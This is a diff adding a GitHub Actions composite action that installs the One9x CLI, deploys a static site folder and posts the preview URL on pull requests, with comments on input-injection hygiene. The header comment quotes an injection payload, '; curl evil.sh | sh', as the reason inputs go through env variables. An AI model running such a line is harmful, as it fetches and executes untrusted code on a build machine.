@@ -1,0 +1,294 @@
+# Deploy to One9x Pages.
+#
+# A thin wrapper over the `one9x` CLI: install it, run one `pages release`, hand
+# back the URL. Composite rather than a Node action on purpose — there is no
+# build step, no node_modules, and no `dist/` to commit and keep in sync with
+# source.
+#
+# THE ONE RULE THIS FILE LIVES BY: no input is ever interpolated into a `run:`
+# block as ${{ inputs.x }}. Every one arrives through `env:` and is used as
+# "$VAR". A ${{ }} interpolation is textual substitution BEFORE bash sees the
+# script, so an input carrying `; curl evil.sh | sh` executes. Inputs come from
+# branch names, PR titles and fork contributors; they are not trusted text.
+name: Deploy to One9x Pages
+description: Build output in, live static site out — deploys a folder to One9x Pages and returns the URL.
+author: One9x
+
+branding:
+  icon: upload-cloud
+  color: orange
+
+inputs:
+  site:
+    description: 'Site name (its subdomain) or numeric id.'
+    required: true
+  dir:
+    description: 'The folder to deploy — your build output, e.g. dist.'
+    required: true
+  token:
+    description: 'A One9x machine token. Create one with `one9x tokens create ci` and store it as a repository secret.'
+    required: true
+
+  deploy:
+    description: >-
+      Publish immediately. Leave false to stage and get a preview URL instead.
+      This is a string, not a boolean, so any expression that renders "true"
+      works — e.g. ${{ github.ref == 'refs/heads/main' }}.
+    default: 'false'
+  spa:
+    description: 'Serve /index.html for unknown paths (single-page apps). Mutually exclusive with `index`.'
+    default: 'false'
+  index:
+    description: 'Serve this file for / instead of /index.html. Mutually exclusive with `spa`.'
+    default: ''
+  error-pages:
+    description: 'One "<code>:<path>" per line, e.g. "404:/404.html".'
+    default: ''
+  exclude:
+    description: 'One glob per line. Matches a single path segment — "**" is not supported.'
+    default: ''
+  tag:
+    description: 'Label this release. Tagged releases are pinned against count-based retention.'
+    default: ''
+
+  cli-version:
+    description: >-
+      Pin the one9x CLI. Defaults to the version this action release was tested
+      against; bumping the action is how a CLI bump reaches you.
+    default: 'v0.3.0'
+  portal:
+    description: 'Portal base URL. Only set this if you are not on portal.one9x.com.'
+    default: 'https://portal.one9x.com'
+
+  comment:
+    description: >-
+      Post a comment on the pull request with the preview URL, updating it in
+      place on later pushes. Needs `permissions: pull-requests: write`.
+      Ignored outside pull_request events.
+    default: 'false'
+  comment-template:
+    description: >-
+      Markdown body for that comment. Placeholders: {site} {url} {preview_url}
+      {version} {seq} {commit}. Empty uses the built-in template.
+    default: ''
+  github-token:
+    description: 'Token used to post the comment.'
+    default: ${{ github.token }}
+
+outputs:
+  url:
+    description: 'The live URL. Empty unless this run published (deploy: true).'
+    value: ${{ steps.release.outputs.url }}
+  preview-url:
+    description: 'The preview URL. Empty unless this run staged (deploy: false).'
+    value: ${{ steps.release.outputs.preview-url }}
+  version:
+    description: 'The release version — a content hash. Identical content always yields this same value.'
+    value: ${{ steps.release.outputs.version }}
+  seq:
+    description: 'The release sequence number, as in v6.'
+    value: ${{ steps.release.outputs.seq }}
+  live:
+    description: '"true" if this release is the one currently being served.'
+    value: ${{ steps.release.outputs.live }}
+  unchanged:
+    description: '"true" if the content was identical to an existing release and nothing new was created.'
+    value: ${{ steps.release.outputs.unchanged }}
+
+runs:
+  using: composite
+  steps:
+    # Installing into RUNNER_TEMP rather than /usr/local/bin is what keeps
+    # install.sh from reaching for sudo — it only escalates when the destination
+    # is not writable.
+    - name: Install the One9x CLI
+      shell: bash
+      env:
+        ONE9X_VERSION: ${{ inputs.cli-version }}
+        ONE9X_INSTALL_DIR: ${{ runner.temp }}/one9x-bin
+      run: |
+        set -euo pipefail
+        mkdir -p "$ONE9X_INSTALL_DIR"
+        curl -fsSL https://get.one9x.com | sh
+        echo "$ONE9X_INSTALL_DIR" >> "$GITHUB_PATH"
+
+    - name: Release
+      id: release
+      shell: bash
+      env:
+        ONE9X_TOKEN: ${{ inputs.token }}
+        ONE9X_PORTAL: ${{ inputs.portal }}
+        # Reproducibility: never let the binary swap itself out mid-run. Do NOT
+        # set ONE9X_AUTO_UPDATE here — it self-updates before every command.
+        ONE9X_NO_UPDATE_CHECK: '1'
+        SITE: ${{ inputs.site }}
+        DIR: ${{ inputs.dir }}
+        DEPLOY: ${{ inputs.deploy }}
+        SPA: ${{ inputs.spa }}
+        INDEX: ${{ inputs.index }}
+        ERROR_PAGES: ${{ inputs.error-pages }}
+        EXCLUDE: ${{ inputs.exclude }}
+        TAG: ${{ inputs.tag }}
+      run: |
+        set -euo pipefail
+
+        # Belt and braces: a token that came from `secrets.` is masked already,
+        # but one passed literally is not, and a leaked token is an account.
+        echo "::add-mask::$ONE9X_TOKEN"
+
+        # Fail with the fix, not with a 401 forty seconds later. This is the
+        # single most common setup mistake.
+        if [ -z "$ONE9X_TOKEN" ]; then
+          echo "::error::the 'token' input is empty. Create one with 'one9x tokens create ci' and store it as a repository secret. Tokens last 90 days — extend with 'one9x tokens extend <id>'."
+          exit 1
+        fi
+        if [ ! -d "$DIR" ]; then
+          echo "::error::dir '$DIR' does not exist. Did the build step run, and is this the folder it wrote?"
+          exit 1
+        fi
+
+        # Built as an ARRAY, never a string: a path with a space in it is a
+        # normal thing and word-splitting a command string mangles it.
+        #
+        # `if … fi` and NOT `[ x ] && args+=(…)`. `set -e` ignores a failed
+        # command anywhere in an AND-OR list except the last, so the `&&` form
+        # is harmless in the middle of a script — and a trap exactly where it
+        # stops being in the middle. The day someone appends nothing after the
+        # final `[ -n "$TAG" ] && …`, a build with no tag exits 1 and the step
+        # goes red with everything having worked. `if` has no such edge.
+        args=(pages release "$DIR" --site "$SITE" --json)
+        if [ "$DEPLOY" = 'true' ]; then args+=(--deploy); fi
+        if [ "$SPA" = 'true' ]; then args+=(--spa); fi
+        if [ -n "$INDEX" ]; then args+=(--index "$INDEX"); fi
+        if [ -n "$TAG" ]; then args+=(--tag "$TAG"); fi
+        if [ -n "$ERROR_PAGES" ]; then
+          while IFS= read -r line; do
+            [ -n "$line" ] || continue
+            args+=(--error "$line")
+          done <<< "$ERROR_PAGES"
+        fi
+        if [ -n "$EXCLUDE" ]; then
+          while IFS= read -r line; do
+            [ -n "$line" ] || continue
+            args+=(--exclude "$line")
+          done <<< "$EXCLUDE"
+        fi
+
+        # --json puts JSON on stdout and progress on stderr, so this captures
+        # one clean document. Echo it so the raw result is in the log even when
+        # a later parse surprises someone.
+        out=$(one9x "${args[@]}")
+        echo "$out"
+
+        # `// ""` on EVERY read, because url and preview_url are mutually
+        # exclusive and the absent one is OMITTED, not null — and a bare
+        # `jq -r .url` on a missing key prints the four characters "null",
+        # which would then flow into someone's deploy summary as a URL.
+        {
+          printf 'url=%s\n'         "$(jq -r '.url // ""'         <<< "$out")"
+          printf 'preview-url=%s\n' "$(jq -r '.preview_url // ""' <<< "$out")"
+          printf 'version=%s\n'     "$(jq -r '.version // ""'     <<< "$out")"
+          printf 'seq=%s\n'         "$(jq -r '.seq // ""'         <<< "$out")"
+          printf 'live=%s\n'        "$(jq -r '.live // false'     <<< "$out")"
+          printf 'unchanged=%s\n'   "$(jq -r '.unchanged // false' <<< "$out")"
+        } >> "$GITHUB_OUTPUT"
+
+    - name: Summary
+      shell: bash
+      env:
+        SITE: ${{ inputs.site }}
+        URL: ${{ steps.release.outputs.url }}
+        PREVIEW_URL: ${{ steps.release.outputs.preview-url }}
+        VERSION: ${{ steps.release.outputs.version }}
+        SEQ: ${{ steps.release.outputs.seq }}
+        UNCHANGED: ${{ steps.release.outputs.unchanged }}
+      run: |
+        set -euo pipefail
+        {
+          echo "### One9x Pages — \`$SITE\`"
+          echo
+          if [ "$UNCHANGED" = 'true' ]; then
+            echo "Nothing changed — this content is already release \`v$SEQ\`."
+            echo
+          fi
+          if [ -n "$URL" ]; then echo "- **Live:** $URL"; fi
+          if [ -n "$PREVIEW_URL" ]; then echo "- **Preview:** $PREVIEW_URL"; fi
+          if [ -n "$SEQ" ]; then echo "- **Release:** \`v$SEQ\`"; fi
+          if [ -n "$VERSION" ]; then echo "- **Version:** \`$VERSION\`"; fi
+        } >> "$GITHUB_STEP_SUMMARY"
+
+    # Off a pull request there is nothing to comment on, so the `if` covers both
+    # the opt-out and the wrong-event case.
+    - name: Comment the preview on the PR
+      if: ${{ inputs.comment == 'true' && github.event_name == 'pull_request' }}
+      shell: bash
+      env:
+        GH_TOKEN: ${{ inputs.github-token }}
+        REPO: ${{ github.repository }}
+        PR: ${{ github.event.pull_request.number }}
+        COMMIT: ${{ github.event.pull_request.head.sha }}
+        TEMPLATE: ${{ inputs.comment-template }}
+        SITE: ${{ inputs.site }}
+        URL: ${{ steps.release.outputs.url }}
+        PREVIEW_URL: ${{ steps.release.outputs.preview-url }}
+        VERSION: ${{ steps.release.outputs.version }}
+        SEQ: ${{ steps.release.outputs.seq }}
+      run: |
+        set -euo pipefail
+
+        tpl="$TEMPLATE"
+        if [ -z "$tpl" ]; then
+          # Assembled line by line rather than as one multi-line literal: this
+          # is inside a YAML block scalar, and a markdown table whose rows start
+          # at column 0 would end the scalar early. printf keeps every YAML line
+          # indented while the string itself carries no leading whitespace —
+          # which matters, because four leading spaces make markdown a code block.
+          #
+          # The last line is deliberate: it hands the reviewer the manual publish
+          # command, so merging is not the only way to ship what they approved.
+          tpl=$(printf '%s\n' \
+            '**Preview ready** for `{site}`' \
+            '' \
+            '| | |' \
+            '| --- | --- |' \
+            '| Preview | {preview_url} |' \
+            '| Release | `v{seq}` |' \
+            '| Commit | {commit} |' \
+            '' \
+            'Publish without waiting for a merge:' \
+            '`one9x pages deploy --site {site} --to v{seq}`')
+        fi
+
+        # Bash parameter expansion, not envsubst or sed: the values are URLs and
+        # hashes, and sed would treat & and / in them as syntax. Single braces
+        # because ${{ }} already belongs to GitHub.
+        body="${tpl//\{site\}/$SITE}"
+        body="${body//\{url\}/$URL}"
+        body="${body//\{preview_url\}/$PREVIEW_URL}"
+        body="${body//\{version\}/$VERSION}"
+        body="${body//\{seq\}/$SEQ}"
+        body="${body//\{commit\}/$COMMIT}"
+
+        # UPSERT, keyed on the site. Without the marker a 20-commit PR collects
+        # 20 comments; keying it on the site lets a monorepo deploy several sites
+        # into one PR and keep one comment each.
+        marker="<!-- one9x-pages-deploy:$SITE -->"
+        # $'\n' and not a literal newline in the assignment: this file is a YAML
+        # block scalar, so a continued line would carry its indentation into the
+        # comment body and markdown would render the first line as code.
+        body="$marker"$'\n'"$body"
+
+        warn() {
+          echo "::warning::the deploy succeeded but the PR comment could not be posted. Add 'permissions: pull-requests: write' to the workflow (or job) if it is missing."
+        }
+
+        # THE COMMENT MUST NEVER FAIL THE JOB. The deploy already happened; a
+        # missing permission is not a reason to report a red build for a site
+        # that is live.
+        id=$(gh api "repos/$REPO/issues/$PR/comments" --paginate \
+               --jq "[.[] | select(.body | startswith(\"$marker\"))] | first | .id // empty" 2>/dev/null || true)
+        if [ -n "$id" ]; then
+          gh api --method PATCH "repos/$REPO/issues/comments/$id" -f body="$body" --silent || warn
+        else
+          gh api --method POST "repos/$REPO/issues/$PR/comments" -f body="$body" --silent || warn
+        fi
